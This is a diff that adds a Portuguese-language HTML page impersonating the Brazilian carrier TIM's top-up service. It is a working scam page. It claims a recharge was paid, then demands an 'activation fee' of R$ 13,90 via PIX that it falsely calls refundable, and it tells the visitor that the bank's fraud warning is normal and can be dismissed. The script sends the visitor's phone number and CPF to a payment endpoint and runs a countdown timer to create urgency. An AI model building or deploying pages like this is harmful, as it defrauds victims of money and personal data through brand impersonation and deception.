@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TIM - Liberação de Créditos</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; outline: none; }
+        body { background-color: #0114C4; margin: 0; padding: 0; color: #333; }
+        .mobile-container { max-width: 480px; margin: 0 auto; background-color: #0114C4; min-height: 100vh; display: flex; flex-direction: column; }
+        
+        header { padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; }
+        .menu-icon { display: flex; flex-direction: column; gap: 4px; }
+        .menu-icon span { display: block; width: 24px; height: 2px; background-color: white; }
+        .tim-logo-header { display: flex; align-items: center; gap: 6px; font-weight: 900; font-size: 24px; text-decoration: none; color: white; }
+        
+        .taxa-main { flex: 1; display: flex; flex-direction: column; }
+        .taxa-card { background: white; border-radius: 24px 24px 0 0; padding: 32px 20px 20px; flex: 1; margin-top: 10px; }
+
+        /* Success Section */
+        .success-section { text-align: center; margin-bottom: 24px; }
+        .success-icon {
+            width: 72px; height: 72px; border-radius: 50%;
+            background: linear-gradient(135deg, #00C853, #00E676);
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 16px; box-shadow: 0 4px 20px rgba(0,200,83,0.35);
+            animation: pulseGreen 2s ease-in-out infinite;
+        }
+        @keyframes pulseGreen {
+            0%, 100% { box-shadow: 0 4px 20px rgba(0,200,83,0.35); }
+            50% { box-shadow: 0 4px 30px rgba(0,200,83,0.55); }
+        }
+        .success-icon svg { width: 36px; height: 36px; }
+        .success-section h2 { font-size: 20px; color: #001A33; font-weight: 900; margin: 0 0 6px; }
+        .success-section p { font-size: 13px; color: #666; margin: 0; line-height: 1.4; }
+        .success-detail { display: inline-flex; align-items: center; gap: 6px; background: #F0FFF4; border: 1px solid #C6F6D5; border-radius: 20px; padding: 6px 14px; margin-top: 10px; font-size: 12px; color: #22543D; font-weight: 600; }
+
+        .divider { height: 1px; background: #EAEAEA; margin: 0 0 24px; }
+
+        /* Alert Box */
+        .alert-box { background: #FFF3E0; border: 1px solid #FFB74D; border-radius: 12px; padding: 14px 16px; display: flex; align-items: center; gap: 12px; margin-bottom: 24px; }
+        .alert-box .alert-icon { font-size: 20px; flex-shrink: 0; }
+        .alert-box p { font-size: 13px; color: #E65100; font-weight: 700; margin: 0; line-height: 1.4; }
+
+        /* Fee Section */
+        .fee-header { display: flex; align-items: center; gap: 10px; margin-bottom: 16px; }
+        .fee-header .shield { width: 40px; height: 40px; background: linear-gradient(135deg, #E3F2FD, #BBDEFB); border-radius: 12px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .fee-header h3 { font-size: 17px; color: #001A33; font-weight: 800; margin: 0; }
+
+        .fee-explanation { font-size: 13px; color: #555; line-height: 1.7; margin-bottom: 20px; }
+        .fee-explanation strong { color: #0114C4; }
+
+        .feature-list { display: flex; flex-direction: column; gap: 12px; margin-bottom: 24px; }
+        .feature-item { display: flex; align-items: flex-start; gap: 12px; background: #FAFBFF; border: 1px solid #E8ECF4; border-radius: 12px; padding: 14px; }
+        .feature-item .fi-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+        .feature-item .fi-text { font-size: 12px; color: #444; line-height: 1.5; font-weight: 500; }
+        .feature-item .fi-text strong { color: #001A33; }
+
+        /* Fee Amount Box */
+        .fee-amount-box { border: 2px solid #0114C4; border-radius: 16px; padding: 20px; text-align: center; margin-bottom: 24px; background: linear-gradient(135deg, #F5F7FF, #EEF1FF); }
+        .fee-amount-box .fee-label { font-size: 11px; font-weight: 800; color: #666; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
+        .fee-amount-box .fee-amount { font-size: 36px; font-weight: 900; color: #0114C4; display: block; }
+        .fee-amount-box .fee-note-small { font-size: 11px; color: #888; margin-top: 4px; }
+
+        /* CTA Button */
+        .btn-pagar-taxa {
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            width: 100%; padding: 16px; border: none; border-radius: 30px;
+            background: linear-gradient(135deg, #FFCC00, #FFD740); color: #0114C4;
+            font-size: 16px; font-weight: 800; cursor: pointer;
+            box-shadow: 0 4px 16px rgba(255,204,0,0.4);
+            transition: all 0.2s ease; margin-bottom: 12px;
+        }
+        .btn-pagar-taxa:active { transform: scale(0.98); box-shadow: 0 2px 8px rgba(255,204,0,0.3); }
+        .btn-pagar-taxa:disabled { opacity: 0.7; pointer-events: none; }
+
+        .taxa-note { font-size: 11px; color: #888; text-align: center; line-height: 1.5; margin-bottom: 24px; }
+
+        /* PIX Section */
+        .pix-section { animation: fadeInUp 0.5s ease forwards; }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .timer-box { border: 1px solid #EAEAEA; background: #FAFAFA; border-radius: 12px; padding: 16px; margin-bottom: 24px; text-align: center; box-shadow: 0 4px 6px rgba(0,0,0,0.02); }
+        .timer-title { font-size: 18px; font-weight: 900; color: #FF192D; margin-bottom: 8px; }
+        .timer-badge { background: #FFF4CC; color: #B37700; font-size: 12px; font-weight: 700; padding: 4px 12px; border-radius: 16px; display: inline-block; }
+
+        .qr-label { font-size: 11px; font-weight: 800; color: #888; letter-spacing: 0.5px; margin-bottom: 12px; text-transform: uppercase; text-align: center; }
+        .qr-code { width: 200px; height: 200px; margin: 0 auto 24px; display: block; border-radius: 8px; background: #f0f0f0; }
+
+        .copy-label { font-size: 11px; font-weight: 800; color: #888; letter-spacing: 0.5px; margin-bottom: 8px; text-transform: uppercase; text-align: center; }
+        .copy-container { display: flex; border-radius: 8px; overflow: hidden; margin-bottom: 24px; border: 1px solid #EAEAEA; }
+        .copy-container input { flex: 1; border: none; background: #FAFAFA; padding: 0 16px; font-size: 12px; color: #666; outline: none; }
+        .btn-copy { background: #20C997; color: white; border: none; padding: 14px 18px; font-weight: 700; font-size: 13px; display: flex; align-items: center; gap: 6px; cursor: pointer; transition: background 0.2s ease; white-space: nowrap; }
+        .btn-copy:active { background: #18a87d; }
+
+        .details-box { border: 1px solid #EAEAEA; background: #FAFAFA; border-radius: 12px; padding: 0 16px; margin-bottom: 24px; text-align: left; }
+        .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 14px 0; border-bottom: 1px solid #EAEAEA; font-size: 13px; }
+        .detail-row:last-child { border-bottom: none; }
+        .detail-row span { color: #666; }
+        .detail-row strong { color: #001A33; font-weight: 800; }
+
+        .secure-footer { font-size: 12px; color: #00C853; font-weight: 800; line-height: 1.5; padding-bottom: 20px; text-align: center; }
+        .secure-footer span { color: #888; font-weight: 400; font-size: 11px; }
+
+        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); color: white; padding: 12px 24px; border-radius: 30px; font-size: 13px; font-weight: 600; opacity: 0; transition: opacity 0.3s; pointer-events: none; z-index: 999; }
+        .toast.show { opacity: 1; }
+
+        @keyframes blink { 0% { opacity: 0.2; } 20% { opacity: 1; } 100% { opacity: 0.2; } }
+        .loading-dots span { animation: blink 1.4s infinite both; }
+        .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+        .warning-box { background: #FFF9E6; border: 1px solid #FFD633; border-radius: 12px; padding: 14px 16px; display: flex; align-items: flex-start; gap: 12px; text-align: left; margin-bottom: 24px; }
+        .warning-box p { font-size: 11px; color: #995C00; margin: 0; line-height: 1.5; font-weight: 500; }
+    </style>
+</head>
+<body>
+    <div class="mobile-container">
+        <header>
+            <a href="../index.html" class="tim-logo-header">
+                <span style="color: #FF192D;">≡</span>
+                <span class="tim-logo-text" style="color: white; letter-spacing: -1px;">TIM</span>
+            </a>
+            <div class="menu-icon">
+                <span></span><span></span><span></span>
+            </div>
+        </header>
+        
+        <main class="taxa-main">
+            <div class="taxa-card">
+                <!-- Success Section -->
+                <div class="success-section">
+                    <div class="success-icon">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                            <polyline points="20 6 9 17 4 12"></polyline>
+                        </svg>
+                    </div>
+                    <h2>Pagamento Identificado!</h2>
+                    <p>Sua recarga está sendo processada</p>
+                    <div class="success-detail">
+                        <span>📱</span>
+                        <span>Recarga de <strong id="display-value">R$ 20,00</strong> para <strong id="display-phone">(41) 99999-9999</strong></span>
+                    </div>
+                </div>
+
+                <div class="divider"></div>
+
+                <!-- Alert -->
+                <div class="alert-box">
+                    <span class="alert-icon">⚠️</span>
+                    <p>Ação necessária para liberar seus créditos na linha</p>
+                </div>
+
+                <!-- Fee Explanation -->
+                <div class="fee-section">
+                    <div class="fee-header">
+                        <div class="shield">
+                            <svg viewBox="0 0 24 24" width="22" height="22" fill="#0114C4"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                        </div>
+                        <h3>Taxa Única de Ativação</h3>
+                    </div>
+
+                    <p class="fee-explanation">
+                        Como esta é a sua <strong>primeira recarga</strong> através da nossa plataforma, é necessário realizar o pagamento de uma <strong>taxa única de ativação e verificação</strong> para que os créditos sejam liberados na sua linha.
+                    </p>
+
+                    <div class="feature-list">
+                        <div class="feature-item">
+                            <span class="fi-icon">🔒</span>
+                            <span class="fi-text"><strong>Verificação de segurança</strong> — Validação antifraude obrigatória para proteger sua conta e garantir a integridade da transação</span>
+                        </div>
+                        <div class="feature-item">
+                            <span class="fi-icon">⚡</span>
+                            <span class="fi-text"><strong>Liberação instantânea</strong> — Seus créditos serão ativados na linha automaticamente após a confirmação do pagamento</span>
+                        </div>
+                        <div class="feature-item">
+                            <span class="fi-icon">🎯</span>
+                            <span class="fi-text"><strong>Cobrada apenas uma vez</strong> — Nas próximas recargas, seus créditos serão liberados diretamente sem nenhuma taxa adicional</span>
+                        </div>
+                        <div class="feature-item">
+                            <span class="fi-icon">💸</span>
+                            <span class="fi-text"><strong>Taxa 100% reembolsável</strong> — O valor da taxa de ativação será estornado automaticamente para sua conta após a liberação dos créditos</span>
+                        </div>
+                    </div>
+
+                    <div class="fee-amount-box">
+                        <div class="fee-label">Taxa de ativação</div>
+                        <span class="fee-amount">R$ 13,90</span>
+                        <div class="fee-note-small">Pagamento único via PIX • Valor reembolsável</div>
+                    </div>
+
+                    <button class="btn-pagar-taxa" id="btn-pagar" onclick="gerarPixTaxa()">
+                        <svg viewBox="0 0 512 512" width="18" height="18" fill="#0114C4"><path d="M410.8 190.4l-117.4-117.4c-20.7-20.7-54.2-20.7-74.8 0L101.2 190.4c-20.7 20.7-20.7 54.2 0 74.8l117.4 117.4c20.7 20.7 54.2 20.7 74.8 0l117.4-117.4c20.7-20.6 20.7-54.1 0-74.8z"/></svg>
+                        Pagar Taxa e Liberar Créditos
+                    </button>
+
+                    <p class="taxa-note">Após a confirmação do pagamento, seus créditos serão liberados automaticamente em até 5 minutos.</p>
+                </div>
+
+                <!-- PIX Section (hidden by default) -->
+                <div id="pix-section" style="display: none;" class="pix-section">
+                    <div class="divider"></div>
+
+                    <div class="timer-box">
+                        <div class="timer-title">Expira em <span id="timer">15:00</span></div>
+                        <div class="timer-badge">Aguardando pagamento da taxa</div>
+                    </div>
+
+                    <div class="qr-label">ESCANEIE COM O APP DO SEU BANCO</div>
+                    <img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" alt="QR Code" class="qr-code" id="qr-code-img">
+
+                    <div class="warning-box">
+                        <span style="font-size:16px;">⚠️</span>
+                        <p>Pagamentos via Pix podem ser sinalizados pelo app do seu banco como medida de proteção. Isso é normal — basta confirmar para prosseguir com segurança.</p>
+                    </div>
+
+                    <div class="copy-label">CHAVE PIX COPIA E COLA</div>
+                    <div class="copy-container">
+                        <input type="text" value="" readonly id="pix-key">
+                        <button class="btn-copy" onclick="copyPix()">
+                            <svg viewBox="0 0 24 24" width="16" height="16" fill="white"><path d="M16 1H4C2.9 1 2 1.9 2 3v14h2V3h12V1zm3 4H8C6.9 5 6 5.9 6 7v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+                            COPIAR
+                        </button>
+                    </div>
+
+                    <div class="details-box">
+                        <div class="detail-row">
+                            <span>Descrição</span>
+                            <strong>Taxa de Ativação</strong>
+                        </div>
+                        <div class="detail-row">
+                            <span>Valor</span>
+                            <strong style="font-size:16px; color: #0114C4;">R$ 13,90</strong>
+                        </div>
+                        <div class="detail-row">
+                            <span>Forma de pagamento</span>
+                            <strong style="display:flex;align-items:center;gap:6px;">
+                                <svg viewBox="0 0 512 512" width="12" height="12" fill="#32BCAD"><path d="M410.8 190.4l-117.4-117.4c-20.7-20.7-54.2-20.7-74.8 0L101.2 190.4c-20.7 20.7-20.7 54.2 0 74.8l117.4 117.4c20.7 20.7 54.2 20.7 74.8 0l117.4-117.4c20.7-20.6 20.7-54.1 0-74.8z"/></svg>
+                                PIX
+                            </strong>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="secure-footer">
+                    🔒 PAGAMENTO SEGURO<br>
+                    <span>Ambiente 100% seguro e criptografado.</span>
+                </div>
+            </div>
+        </main>
+    </div>
+    
+    <div class="toast" id="toast">Código copiado com sucesso!</div>
+
+    <script>
+        // URL params
+        const urlParams = new URLSearchParams(window.location.search);
+        const phone = urlParams.get('phone');
+        const value = urlParams.get('value');
+
+        if (phone) document.getElementById('display-phone').textContent = phone;
+        if (value) document.getElementById('display-value').textContent = 'R$ ' + value;
+
+        // Generate PIX for the fee
+        async function gerarPixTaxa() {
+            const btn = document.getElementById('btn-pagar');
+            btn.disabled = true;
+            btn.innerHTML = 'Gerando PIX <span class="loading-dots"><span>.</span><span>.</span><span>.</span></span>';
+
+            try {
+                const response = await fetch('/api/pix', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        phone: phone || '', 
+                        cpf: urlParams.get('cpf') || '', 
+                        value: '13,90' 
+                    })
+                });
+                const result = await response.json();
+                
+                if (result.success && result.data && result.data.paymentData) {
+                    const payData = result.data.paymentData;
+                    
+                    // Hide button, show PIX section
+                    btn.style.display = 'none';
+                    document.querySelector('.taxa-note').style.display = 'none';
+                    const pixSection = document.getElementById('pix-section');
+                    pixSection.style.display = 'block';
+                    
+                    // Set copy-paste key
+                    document.getElementById('pix-key').value = payData.copyPaste || payData.qrCode;
+                    
+                    // Generate QR code image from PIX string
+                    const pixString = payData.copyPaste || payData.qrCode || payData.qrCodeBase64;
+                    document.getElementById('qr-code-img').src = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(pixString);
+                    
+                    // Start timer
+                    startTimer();
+                    
+                    // Scroll to PIX section
+                    setTimeout(() => {
+                        pixSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                    }, 300);
+                } else {
+                    alert('Erro ao gerar o PIX. Tente novamente.');
+                    btn.disabled = false;
+                    btn.innerHTML = '<svg viewBox="0 0 512 512" width="18" height="18" fill="#0114C4"><path d="M410.8 190.4l-117.4-117.4c-20.7-20.7-54.2-20.7-74.8 0L101.2 190.4c-20.7 20.7-20.7 54.2 0 74.8l117.4 117.4c20.7 20.7 54.2 20.7 74.8 0l117.4-117.4c20.7-20.6 20.7-54.1 0-74.8z"/></svg> Pagar Taxa e Liberar Créditos';
+                }
+            } catch (error) {
+                console.error('Erro:', error);
+                alert('Falha de conexão. Tente novamente.');
+                btn.disabled = false;
+                btn.innerHTML = '<svg viewBox="0 0 512 512" width="18" height="18" fill="#0114C4"><path d="M410.8 190.4l-117.4-117.4c-20.7-20.7-54.2-20.7-74.8 0L101.2 190.4c-20.7 20.7-20.7 54.2 0 74.8l117.4 117.4c20.7 20.7 54.2 20.7 74.8 0l117.4-117.4c20.7-20.6 20.7-54.1 0-74.8z"/></svg> Pagar Taxa e Liberar Créditos';
+            }
+        }
+
+        // Timer
+        function startTimer() {
+            let timeInSeconds = 15 * 60;
+            const timerElement = document.getElementById('timer');
+            const updateTimer = () => {
+                const minutes = Math.floor(timeInSeconds / 60);
+                const seconds = timeInSeconds % 60;
+                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                if (timeInSeconds > 0) timeInSeconds--;
+            };
+            setInterval(updateTimer, 1000);
+            updateTimer();
+        }
+
+        // Copy PIX
+        function copyPix() {
+            const pixKey = document.getElementById('pix-key');
+            pixKey.select();
+            pixKey.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(pixKey.value).catch(() => document.execCommand('copy'));
+            
+            const toast = document.getElementById('toast');
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2000);
+        }
+    </script>
+</body>
+</html>
